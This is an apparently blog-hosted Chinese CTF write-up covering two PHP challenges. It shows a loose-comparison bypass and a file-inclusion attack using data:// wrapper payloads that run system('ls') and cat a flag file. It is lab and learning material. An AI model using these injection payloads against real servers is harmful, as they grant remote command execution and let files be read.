@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>web6 | qin</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1.做题 2.总结 1.1攻防世界simple_php: ​     开启靶机，是php代码，进行代码审计。当a&#x3D;&#x3D;0且a为真，b不为纯数字且b&gt;1234时，才能得到flag 12345678910111213141516171819202122232425&lt;?php&#x2F;&#x2F; 显示当前文件的源代码show_source(__FILE__);&#x2F;&#x2F; 包含配置文件 confi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web6">
+<meta property="og:url" content="https://qin456486.github.io/2025/01/25/web6/index.html">
+<meta property="og:site_name" content="qin">
+<meta property="og:description" content="1.做题 2.总结 1.1攻防世界simple_php: ​     开启靶机，是php代码，进行代码审计。当a&#x3D;&#x3D;0且a为真，b不为纯数字且b&gt;1234时，才能得到flag 12345678910111213141516171819202122232425&lt;?php&#x2F;&#x2F; 显示当前文件的源代码show_source(__FILE__);&#x2F;&#x2F; 包含配置文件 confi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://qin456486.github.io/imgs/$%7Bfiilename%7D/QQ20250125-211943.png">
+<meta property="og:image" content="https://qin456486.github.io/imgs/$%7Bfiilename%7D/QQ20250125-212245.png">
+<meta property="og:image" content="https://qin456486.github.io/imgs/$%7Bfiilename%7D/QQ20250125-212437.png">
+<meta property="article:published_time" content="2025-01-25T09:10:10.000Z">
+<meta property="article:modified_time" content="2025-01-25T13:27:10.125Z">
+<meta property="article:author" content="qin456486">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qin456486.github.io/imgs/$%7Bfiilename%7D/QQ20250125-211943.png">
+  
+    <link rel="alternate" href="/atom.xml" title="qin" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qin</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://qin456486.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web6" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/25/web6/" class="article-date">
+  <time class="dt-published" datetime="2025-01-25T09:10:10.000Z" itemprop="datePublished">2025-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      web6
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a href="">1.做题</a></p>
+<p><a href="">2.总结</a></p>
+<p><strong>1.1攻防世界simple_php</strong>:</p>
+<p>​     开启靶机，是php代码，进行代码审计。当a&#x3D;&#x3D;0且a为真，b不为纯数字且b&gt;1234时，才能得到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 显示当前文件的源代码</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 包含配置文件 config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="comment">// 从 GET 请求中获取参数 a 的值，并赋值给变量 $a</span></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// 从 GET 请求中获取参数 b 的值，并赋值给变量 $b</span></span><br><span class="line"><span class="variable">$b</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="comment">// 判断 $a 是否等于 0 并且 $a 为真（非空、非零等）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果条件满足，输出 $flag1 变量的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断 $b 是否为数字或数字字符串</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果是数字，终止脚本执行</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断 $b 是否大于 1234</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$b</span> &gt; <span class="number">1234</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果条件满足，输出 $flag2 变量的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>​     a,&#x3D;&#x3D;为弱比较，会自动转化类型比较，采用字符串绕过，’0’与0比较时，返回true。b,php中，字母和数字的字符串与数字比较的时候，会将该字符串的数字部分转化为数字来比较，所以b可以写成9999a.构造<code>/?a=&#39;0&#39;&amp;b=9999a</code>,得到flag。</p>
+<p><strong>1.2攻防世界Web_php_include</strong>：</p>
+<p>​     开启环境，如下代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​      代码审计，page参数中php:&#x2F;&#x2F; 替换为了空格。不可用php:&#x2F;&#x2F;的伪协议，输入<code> /?page=data://text/plain,&lt;?php phpinfo();?&gt; </code>,如下图，故可以尝试data:&#x2F;&#x2F;伪协议。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250125-211943.png"></p>
+<p>​     构造payload<code>/?page=data://text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</code>,</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250125-212245.png">     </p>
+<p>​     再构造<code>/?page=data://text/plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;</code>,查flag.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250125-212437.png"></p>
+<p><strong>2.1总结</strong>: 弱比较：(1).当字符串与数字弱比较时，会将字符串转为数组，纯数字字符串转化为对应数字，而纯字母字符串会转为0。(2).如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行。字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php 弱类型总结 - Mrsm1th - 博客园</a></p>
+<p><strong>2.2总结</strong>: md5比较：(1).0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。(2).指字符串经过 <code>md5()</code> 函数计算后得到的哈希值是以 <code>0e</code> 开头的。</p>
+<p><strong>2.3总结</strong>: data:&#x2F;&#x2F;伪协议：<code>data://text/plain,xxx(数据)</code></p>
+<p>​                                           <code>data://text/plain;base64,xxxx(base64编码后的数据)</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://qin456486.github.io/2025/01/25/web6/" data-id="cm6c86uow0000u8v3cagr5fet" data-title="web6" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/01/24/web5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">web5</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/25/web6/">web6</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/24/web5/">web5</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/23/web4/">web4</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/18/web3/">web3</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/18/web2/">web2</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 qin456486<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
